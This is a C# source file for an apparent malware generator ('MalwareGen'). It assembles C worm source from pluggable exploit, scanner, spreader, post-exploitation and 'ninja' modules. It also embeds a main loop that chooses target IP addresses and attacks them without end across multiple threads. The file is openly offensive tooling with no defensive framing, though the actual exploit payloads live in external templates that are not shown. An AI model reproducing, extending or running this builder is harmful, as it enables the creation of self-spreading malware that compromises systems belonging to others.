using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Windows.Forms;
using System.Xml;

namespace MalwareGen
{
    class Controller
    {
        private static string mainExploit =
            "	int  ipAddress[4];\r\n"
            + "[chooseIP](ipAddress);\r\n"
            + "	for (;;){\r\n"
            + "	initAttack(ipAddress);\r\n"
            + "    }\r\n"
            + "    WSACleanup();\r\n";
        private static List<Modules> lsModules = new List<Modules>();
        private static string[] types = { "exploit","control","ninja","postexploit","scanner","spreader"} ;
        public static string moduleDir = @"Modules";
        public static string templateDir = @"Template";
        public static string outputDir = @"Output";
        public static string getAllModuleName()
        {
            string ret ="";
            foreach(Modules test in lsModules)
            {
                ret += test.MName + Environment.NewLine;
            }
            return ret;
        }
        private static void removeModulebyName(string MName)
        {
            lsModules.Remove(lsModules.Find(p => p.MName == MName));
        }
        public static void BuildTree(DirectoryInfo directoryInfo, TreeNodeCollection addInMe)
        {
            TreeNode curNode = addInMe.Add(directoryInfo.Name);

            //foreach (FileInfo file in directoryInfo.GetFiles())
            //{
               
            //    curNode.Nodes.Add(file.FullName, file.Name);
            //}
            foreach (DirectoryInfo subdir in directoryInfo.GetDirectories())
            {
                BuildTree(subdir, curNode.Nodes);
            }
        }
        public static bool checkMType(Modules mod)
        {
            if (types.Contains(mod.MType.ToLower()))
                return true;
            return false;
        }
        public static void addModules(Modules mod)
        {
            //validate module
            if(mod.MName == "" && !(checkMType(mod)))
            {
                MessageBox.Show("This module is not valid! Please check again");
                return;
            }
            try
            {
                //Each module just add once
                bool check=true;
                foreach(Modules a in lsModules)
                {
                    if (mod.MName == a.MName)
                        check = false;
                }
                if (check)
                {
                    lsModules.Add(mod);
                }
            }
            catch(Exception e)
            {
                MessageBox.Show(e.ToString());
            }
            
        }
        public static void generate(string malName,string threads)
        {
            
            //copy template file to output folder
            string targetDir = Path.Combine(outputDir, malName);
            if (!Directory.Exists(targetDir))
            {
                Directory.CreateDirectory(targetDir);
            }
            string headerFile = targetDir + "\\" + malName + ".h";
            string sourceFile = targetDir + "\\" + malName + ".c";
            File.Copy(templateDir+"\\hostip.h",headerFile , true);
            File.Copy(templateDir + "\\hostip.c", sourceFile, true);

            //Create header file
            generateHeader(malName,threads);
            if (hasExploit())
            {
                //+choose main spreader
                //+replace main exploit
                generateExploit(malName);
            }

            else { }

        }
        public static bool hasExploit()
        {
            bool check = false;
            foreach (Modules a in lsModules)
            {
                if (a.MType.ToLower() == "exploit")
                    check = true;
            }
            return check;
        }
        public static void generateHeader(string malName, string threads)
        {
            string headerFile = outputDir + "\\" + malName + "\\" + malName + ".h";
            string text = "";
            text = File.ReadAllText(headerFile);
            //include source file
            text = text.Replace("[sourcefile]", Environment.NewLine + "#include \"" + malName + ".c\"");
            //Define Malware name
            text = text.Replace("[malwareName]", Environment.NewLine + "#define MALNAME \"" +malName+"\"");
            string tmp = "";
            //include header string
            foreach (Modules test in lsModules)
            {
                //include header file
                foreach (string a in test.Files)
                    tmp += (a.Substring(a.Length-2,2) == ".h") ? "#include \""+a+"\"" + Environment.NewLine : "";
            }
            text = text.Replace("[headerfile]", Environment.NewLine + tmp);
            tmp = "";
            //include header string
            foreach (Modules test in lsModules)
            {
                tmp += "//" + test.MName + Environment.NewLine + test.Header.Trim() + Environment.NewLine;
            }
            text = text.Replace("[headerstring]", Environment.NewLine + tmp);
            tmp = "";
            //define thread number
            tmp = threads;
            text = text.Replace("[threads]", tmp);
            File.WriteAllText(headerFile, text);
        }
        public static void generateExploit(string malName)
        {
            string mainFile = outputDir + "\\" + malName + "\\" + malName + ".c";
            //exFunc store exploit function for each exploit Module.
            //exThre store the code that run the exploit Module in mutithreads mode.
            string exFunc = "";
            string exThre = "";
            string tmp = "";
            tmp = File.ReadAllText(templateDir + "\\" + "hostip.c");
            foreach (Modules test in lsModules)
            {
                if(test.MType.ToLower() == "exploit")
                {
                    //generate exploit function
                    exFunc += File.ReadAllText(templateDir + "\\" + "exploitFunction.c");
                    exFunc = exFunc.Replace("[exploitName]", test.MName);
                    exFunc = exFunc.Replace("[isExploit]", "isTarget_"+test.MName);
                    exFunc = exFunc.Replace("[Spreader]", test.spreader);
                    exFunc += Environment.NewLine;
                    //generate exploit threads
                    exThre += File.ReadAllText(templateDir + "\\" + "exploitThreads.c");
                    exThre = exThre.Replace("[exploitName]", test.MName);
                    exThre = exThre.Replace("[increaseIP]", test.increaseip);
                    exThre += Environment.NewLine;
                }
            }
            tmp = tmp.Replace("[exploitThreads]", Environment.NewLine + exThre);
            tmp = tmp.Replace("[exploit_function]", Environment.NewLine + exFunc);
            File.WriteAllText(mainFile, tmp);
        }

    }
}
